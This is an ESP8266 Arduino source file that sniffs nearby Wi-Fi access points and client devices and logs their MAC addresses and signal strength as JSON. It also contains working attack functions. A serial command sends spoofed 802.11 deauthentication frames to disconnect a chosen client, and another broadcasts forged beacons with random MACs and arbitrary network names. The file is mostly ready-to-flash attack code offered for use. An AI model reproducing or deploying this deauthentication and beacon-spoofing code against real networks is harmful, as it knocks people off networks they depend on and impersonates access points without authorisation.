/*
 * By Lars Juhl Jensen 20170415 compiled on OS X using Arduino 1.8.2
 * Distributed under the MIT license (URL)
 * 
 * Based on Ray Burnette's ESP8266 Mini Sniff (MIT) https://www.hackster.io/rayburne/esp8266-mini-sniff-f6b93a
 * in turn based on RandDruid/esp8266-deauth (MIT) https://github.com/RandDruid/esp8266-deauth
 * inspired by kripthor/WiFiBeaconJam (no license) https://github.com/kripthor/WiFiBeaconJam
 * https://git.schneefux.xyz/schneefux/jimmiejammer/src/master/jimmiejammer.ino
 *
 * Fake beacon code based on H-LK/ESP8266-SSID-Text-Broadcast (no license) https://github.com/H-LK/ESP8266-SSID-Text-Broadcast
 * in turn based on kripthor/WiFiBeaconJam (no license) https://github.com/kripthor/WiFiBeaconJam
 */

//#include <ESP8266WiFi.h>

#include <ESP8266WiFi.h>
extern "C" {
  #include <espnow.h>
}

//#include <TaskScheduler.h>




// Callback methods prototypes
//void t2Callback();

//Task t2(3000, TASK_FOREVER, &t2Callback);

//Scheduler runner;



/*
 * Constants.
 */
#define ETH_MAC_LEN 6
#define MAX_BEACONS 256
#define MAX_CLIENTS 256


/*
 * Expose Espressif SDK functionality.
 */
extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int  wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int  wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}


/*
 * Promiscous callback structures, see ESP manual
 */
struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bmatch0: 1;
  unsigned bmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

struct sniffer_buf1 {
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};

struct sniffer_buf2 {
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct {
    uint16_t len;
    uint16_t seq;
    uint8_t  address3[ETH_MAC_LEN];
  } lenseq[1];
};


/*
 * Data structure for beacon information
 */
struct beaconinfo {
  uint8_t beacon[ETH_MAC_LEN];
  uint8_t ssid[33];
  uint8_t ssid_len;
  uint8_t channel;
  uint8_t rssi;
  bool err;
};


/*
 * Data structure for client information
 */
struct clientinfo {
  uint8_t beacon[ETH_MAC_LEN];
  uint8_t station[ETH_MAC_LEN];
  uint8_t rssi;
  uint16_t seq;
  bool err;
};


/*
 * Global variables for storing beacons and clients
 */
beaconinfo beacons_known[MAX_BEACONS];
clientinfo clients_known[MAX_CLIENTS];
char fake_beacon_ssid[14][16];
unsigned int beacons_count = 0;
unsigned int beacons_index = 0;
unsigned int clients_count = 0;
unsigned int clients_index = 0;
uint8_t channel = 1;
uint8_t nothing_new = 0;


/*
 * Function that parses beacon information from frame
 */
struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi) {
  struct beaconinfo bi;
  bi.ssid_len = 0;
  bi.channel = 0;
  bi.err = 0;
  bi.rssi = -rssi;
  int pos = 36;
  if (frame[pos] == 0x00) {
    while (pos < framelen) {
      switch (frame[pos]) {
        case 0x00: //SSID
          bi.ssid_len = (int) frame[pos + 1];
          if (bi.ssid_len == 0) {
            memset(bi.ssid, '\x00', 33);
            break;
          }
          if (bi.ssid_len < 0) {
            bi.err = 1;
            break;
          }
          if (bi.ssid_len > 32) {
            bi.err = 1;
            break;
          }
          memset(bi.ssid, '\x00', 33);
          memcpy(bi.ssid, frame + pos + 2, bi.ssid_len);
          bi.err = 0;
          break;
        case 0x03: //Channel
          bi.channel = (int) frame[pos + 2];
          pos = -1;
          break;
        default:
          break;
      }
      if (pos < 0) break;
      pos += (int) frame[pos + 1] + 2;
    }
  } else {
    bi.err = 1;
  }
  memcpy(bi.beacon, frame + 10, ETH_MAC_LEN);
  return bi;
}


/*
 * Function that parses client information from packet
 */
uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };
struct clientinfo parse_client(uint8_t *frame, uint16_t framelen, signed rssi) {
  struct clientinfo ci;
  ci.err = 0;
  ci.rssi = -rssi;
  int pos = 36;
  uint8_t *beacon;
  uint8_t *station;
  uint8_t ds;
  ds = frame[1] & 3;
  switch (ds) {
    case 0:
      beacon = frame+16;
      station = frame+10;
      break;
    case 1:
      beacon = frame+4;
      station = frame+10;
      break;
    case 2:
      beacon = frame+10;
      if (memcmp(frame+4, broadcast1, 3) || memcmp(frame+4, broadcast2, 3) || memcmp(frame+4, broadcast3, 3)) {
        station = frame+16;
      } else {
        station = frame+4;
      }
      break;
    case 3:
      beacon = frame+10;
      station = frame+4;
      break;
  }
  memcpy(ci.station, station, ETH_MAC_LEN);
  memcpy(ci.beacon, beacon, ETH_MAC_LEN);
  ci.seq = frame[23] * 0xFF + (frame[22] & 0xF0);
  return ci;
}


/*
 * Function that stores information about single beacon
 */
int store_beacon(beaconinfo bi) {
  int known = 0;
  int u;
  for (u = 0; u < beacons_count; u++) {
    if (!memcmp(beacons_known[u].beacon, bi.beacon, ETH_MAC_LEN)) {
      known = 1;
      break;
    }
  }
  if (known) {
    memcpy(&beacons_known[u], &bi, sizeof(bi));
  } else {
    memcpy(&beacons_known[beacons_index], &bi, sizeof(bi));
    if (beacons_count < MAX_BEACONS) beacons_count++;
    beacons_index++;
    if (beacons_index == MAX_BEACONS) beacons_index = 0;
  }
  return known;
}


/*
 * Function that stores information about single client
 */
int store_client(clientinfo ci) {
  int known = 0;
  int u;
  for (u = 0; u < clients_count; u++) {
    if (!memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN)) {
      known = 1;
      break;
    }
  }
  if (known) {
    memcpy(&clients_known[u], &ci, sizeof(ci));
  } else {
    memcpy(&clients_known[clients_index], &ci, sizeof(ci));
    if (clients_count < MAX_CLIENTS) clients_count++;
    clients_index++;
    if (clients_index == MAX_CLIENTS) clients_index = 0;
  }
  return known;
}


/*
 * Callback function for promiscuous mode that parses received packet
 */
void parse_packet(uint8_t *buf, uint16_t len) {
  int i = 0;
  if (len == 12) {
    struct RxControl *sniffer = (struct RxControl*) buf;
  } else if (len == 128) {
    struct sniffer_buf1 *sniffer = (struct sniffer_buf1*) buf;
    struct beaconinfo bi = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    if (bi.err == 0 && store_beacon(bi) == 0) nothing_new = 0;
  } else {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) {
      struct clientinfo ci = parse_client(sniffer->buf, 36, sniffer->rx_ctrl.rssi);
      if (memcmp(ci.beacon, ci.station, ETH_MAC_LEN)) {
        if (ci.err == 0 && store_client(ci) == 0) nothing_new = 0;
      }
    }
  }
}


/*
 * Send deauth packets to client.
 */
uint8_t deauth_template[26] = {
  0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00
};
void deauth_client(clientinfo ci) {
  uint8_t packet_buffer[64];
  memcpy(packet_buffer, deauth_template, 26);
  memcpy(packet_buffer + 4, ci.station, ETH_MAC_LEN);
  memcpy(packet_buffer + 10, ci.beacon, ETH_MAC_LEN);
  memcpy(packet_buffer + 16, ci.beacon, ETH_MAC_LEN);
  for (uint8_t i = 0; i < 0x10; i++) {
    uint16_t seq = ci.seq + 0x10 * i;
    packet_buffer[22] = seq % 0xFF;
    packet_buffer[23] = seq / 0xFF;
    wifi_send_pkt_freedom(packet_buffer, 26, 0);
    delay(1);
  }
}


/*
 * Send fake beacon packets.
 */
uint8_t beacon_packet[128] = {
  0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xc0, 0x6c, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0x64, 0x00, 0x01, 0x04, 0x00, 0x10, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
  0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01, 0x04
};
void fake_beacon(char *ssid, uint8_t packets) {
  if (strlen(ssid) > 0 && packets > 0) {
    beacon_packet[10] = beacon_packet[16] = random(256);
    beacon_packet[11] = beacon_packet[17] = random(256);
    beacon_packet[12] = beacon_packet[18] = random(256);
    beacon_packet[13] = beacon_packet[19] = random(256);
    beacon_packet[14] = beacon_packet[20] = random(256);
    beacon_packet[15] = beacon_packet[21] = random(256);
    strncpy((char *)beacon_packet+38, ssid, 16);
    for (uint8_t i = 0; i < packets; i++) {
      wifi_send_pkt_freedom(beacon_packet, 57, 0);
    }
  }
}


/*
 * Function that prints single beacon in JSON format
 */
void print_beacon(beaconinfo bi) {
  Serial.print("\"");
  for (int i = 0; i < ETH_MAC_LEN; i++) {
    if (i > 0) Serial.print(":");
    Serial.printf("%02x", bi.beacon[i]);
  }
  Serial.printf("\":{\"channel\":%d,\"rssi\":-%d,\"ssid\":\"%s\"}", bi.channel, bi.rssi, bi.ssid);
}


/*
 * Function that prints single client in JSON format
 */
void print_client(clientinfo ci) {
  Serial.print("\"");
  for (int i = 0; i < ETH_MAC_LEN; i++) {
    if (i > 0) Serial.print(":");
    Serial.printf("%02x", ci.station[i]);
  }
  Serial.print("\":{\"beacon\":\"");
  for (int i = 0; i < ETH_MAC_LEN; i++) {
    if (i > 0) Serial.print(":");
    Serial.printf("%02x", ci.beacon[i]);
  }
  Serial.printf("\",\"rssi\":-%d}", ci.rssi);
}


/*
 * Function that prints all beacons in JSON format
 */
void print_beacons() {
  Serial.print("{");
  for (int u = 0; u < beacons_count; u++) {
    if (u > 0) Serial.print(",");
    print_beacon(beacons_known[u]);
  }
  Serial.print("}");
}


/*
 * Function that prints all clients in JSON format
 */
void print_clients() {
  Serial.print("{");
  for (int u = 0; u < clients_count; u++) {
    if (u > 0) Serial.print(",");
    print_client(clients_known[u]);
  }
  Serial.print("}");
}


/*
 * Function that prints all beacons and clients in JSON format
 */
void print_all() {
  Serial.print("{\"beacons\":");
  print_beacons();
  Serial.print(",\"clients\":");
  print_clients();
  Serial.print("}");
}


/*
 * Function that reads and executes a command from serial
 */
void read_command() {
  char command[64];
  command[Serial.readBytesUntil('\n', command, 63)] = '\0';
  char *argument = strchr(command, ' ');
  if (argument != NULL) {
    *argument = '\0';
    argument++;
  }
  if (strcmp(command, "deauth_client") == 0) {
    uint8_t station[ETH_MAC_LEN];
    for (int i = 0; i < ETH_MAC_LEN; i++) {
      station[i] = strtol(argument+3*i, NULL, HEX);
    }
    for (int u = 0; u < clients_count; u++) {
      if (memcmp(clients_known[u].station, station, ETH_MAC_LEN) == 0) {
        deauth_client(clients_known[u]);
        break;
      }
    }
  }
  else if (strcmp(command, "fake_beacon") == 0) {
    char *argument_ssid;
    uint8_t argument_channel = strtol(argument, &argument_ssid, DEC);
    if (argument_ssid != argument) {
      if (*argument_ssid != '\0') argument_ssid++;
      memset(fake_beacon_ssid[argument_channel-1], 0, 16);
      strncpy(fake_beacon_ssid[argument_channel-1], argument_ssid, 16);
    }
  }
  else if (strcmp(command, "print_all") == 0) {
    print_all();
  }
  else if (strcmp(command, "print_beacons") == 0) {
    print_beacons();
  }
  else if (strcmp(command, "print_clients") == 0) {
    print_clients();
  }
  Serial.println("");
}


/*
 * Initial setup
 */
void setup() {
  Serial.begin(115200);

/*

  Serial.println("Scheduler TEST");
  
  runner.init();
  Serial.println("Initialized scheduler");
  
  runner.addTask(t2);
  Serial.println("added t2");
  
  Serial.println("test de envio");

  t2.enable();
  Serial.println("Enabled t2");
  
  delay(3000);
 */


  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(channel);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(parse_packet);
  wifi_promiscuous_enable(1);
}


/*
 * Main loop
 */
void loop() {
  if (nothing_new >= 10) {
    nothing_new = 0;
    channel++;
    if (channel == 15) channel = 1;
    wifi_set_channel(channel);
  }
  else {
    nothing_new++;
  }
  fake_beacon(fake_beacon_ssid[channel-1], 4);
  delay(1);
  if (Serial.available() > 0) {
    read_command();
  }

// runner.execute();
}



void t2Callback() {
    wifi_promiscuous_enable(0);
    Serial.print("paramos sniffer ");
    Serial.println(millis());
    Serial.print("encendemos sniffer ");
    wifi_set_opmode(STATION_MODE);
    wifi_set_channel(channel);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(parse_packet);
    wifi_promiscuous_enable(1);
  
}


